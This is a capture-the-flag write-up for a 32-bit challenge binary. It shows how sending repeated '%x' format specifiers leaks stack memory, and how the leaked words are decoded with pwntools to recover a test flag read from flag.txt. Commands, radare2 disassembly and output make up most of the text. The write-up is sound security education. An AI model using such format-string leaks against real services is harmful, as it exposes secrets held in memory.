Leak Me or Leave Me Pwn Challenge - Break_In CTF

```
# ./leak                                                                   
flag file seems to be missing.contact administrator .
# echo 'FL4G{fake_flag_for_test}' > flag.txt
```

```
# ./leak 
LEAK ME OR LEAVE ME
> 
```
From the name of the challenge, we can assume that it is about Format String Vulnerability. We can exploit it to leak memory from the stack by providing the "%x" format specifier

```
# ./leak
LEAK ME OR LEAVE ME
> %x %x
80 f7f055c0
```

Okay it's working. So I analyzed the binary with radare2. Disassembly of the main function shows
```
<----------------------------------------------------SNIP----------------------------------------------------->
0x0804861e      8d8390e7ffff   lea eax, dword [ebx - 0x1870]
0x0804861d      50             push eax                    ; const char *mode
0x0804861e      8d8392e7ffff   lea eax, dword [ebx - 0x186e]
0x08048624      50             push eax                    ; const char *filename
0x08048625      e866feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
<----------------------------------------------------SNIP----------------------------------------------------->
```
So i guess it opens the flag.txt file. So the file contents must be placed on the stack. Leaking multiple address might leak it's content

```
# python -c 'print "%x " * 50' | ./leak                                                                                                               
LEAK ME OR LEAVE ME         
> 80 f7f745c0 0 0 ffe85fcc 8cc2160 47344c46 6b61667b 6c665f65 665f6761 745f726f 7d747365 f63d000a f7fc1b0c ffe86064 80482e8 f7fa2936 804823c ffe8606c 
f7fc1ab0 1 f7f92410 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 2078
2520 25207825 78252078 20782520 25207825 78252078 
```
The last addresses are the hex of "%x " input we provided. I noticed the seventh address immediately and i guess it is the "FL4G" text. I used python to confirm.

```python
Python 3.7.5 (default, Oct 27 2019, 15:43:29) 
[GCC 9.2.1 20191022] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *                                                                                                                                
>>> out = "47344c46 6b61667b 6c665f65 665f6761 745f726f 7d747365 f63d000a".split(" ")                                                                
>>> for o in out:
...     addr = p32(int('0x'+o, 16))
...     print(addr.decode(), end='')
... 
Traceback (most recent call last):
  File "<stdin>", line 3, in <module>
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf6 in position 3: invalid start byte
FL4G{fake_flag_for_test}>>>
```
Yes it is indeed our fake flag. So we can use the same technique against server to get the flag
